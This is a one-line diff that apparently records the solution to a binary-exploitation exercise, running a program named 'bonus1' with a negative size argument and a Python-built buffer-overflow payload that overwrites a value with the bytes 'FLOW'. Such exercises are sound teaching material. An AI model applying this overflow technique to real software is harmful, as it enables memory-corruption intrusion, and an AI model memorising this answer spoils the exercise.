@@ -1,0 +1,1 @@
+`./bonus1 -1073741812 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')`
